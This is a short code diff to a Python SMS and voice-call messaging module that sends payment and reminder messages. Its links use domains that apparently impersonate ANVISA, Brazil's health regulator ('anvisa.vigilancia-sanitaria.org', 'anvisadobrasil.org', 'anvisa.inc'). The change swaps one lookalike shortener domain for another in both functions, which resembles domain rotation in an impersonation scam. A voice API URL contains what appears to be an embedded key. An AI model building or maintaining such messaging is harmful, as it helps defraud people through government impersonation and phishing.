@@ -231,7 +231,7 @@ def _send_initial_payment_sms_async(transaction_id, customer_data):
             'enableVoiceCall': True,
             'campaignName': "SEGURO1",
             'shortenableLink': f"https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}", 
-            'shortenerDomain': "anvisadobrasil.org",
+            'shortenerDomain': "anvisa.inc",
             'voiceApiUrl': "https://v1.call4u.com.br/api/integrations/add/37d097caf1299d9aa79c2c2b843d2d78/default"
         }
         
@@ -356,7 +356,7 @@ def _send_reminder_sms_async(transaction_id, customer_data):
             'enableVoiceCall': True,
             'campaignName': "INFORMAGERADO",
             'shortenableLink': f"https://anvisa.vigilancia-sanitaria.org/remarketing/{transaction_id}", 
-            'shortenerDomain': "anvisadobrasil.org",
+            'shortenerDomain': "anvisa.inc",
         }
         
 
